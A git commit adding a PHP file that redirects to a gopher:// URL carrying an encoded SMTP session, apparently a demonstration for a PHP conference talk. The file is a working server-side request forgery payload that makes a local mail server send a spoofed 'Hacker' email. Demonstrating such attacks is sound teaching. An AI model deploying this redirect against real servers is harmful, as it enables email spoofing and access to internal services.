d3b57230b3cf25b874c5fbed00cb89c744647b39
Xavier Leune <xleune@ccmbenchmark.com>
2018-10-25 00:22:21 +0200

    Commit initial

---
+++ public/redirect-to-gopher.php
@@ -0,0 +1,3 @@
+<?php
+header('Location: gopher://127.0.0.1:25/bHELO%20localhost%0AMAIL%20FROM%3A%3Cxavier%2Bforumphp%40ccmbenchmark.com%3E%0ARCPT%20TO%3A%3Cxavier.leune%40gmail.com%3E%0ADATA%0AFrom%3A%20%5BHacker%5D%20%3Cxavier%40ccmbenchmark.com%3E%0ATo%3A%20%3Cxavier.leune%40gmail.com%3E%0ADate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%0ASubject%3A%20Ah%20Ah%20AH%0A%0AD%C3%A9mo%20FORUM%20PHP%0A%0A%0A.%0AQUIT%0A');
+exit;
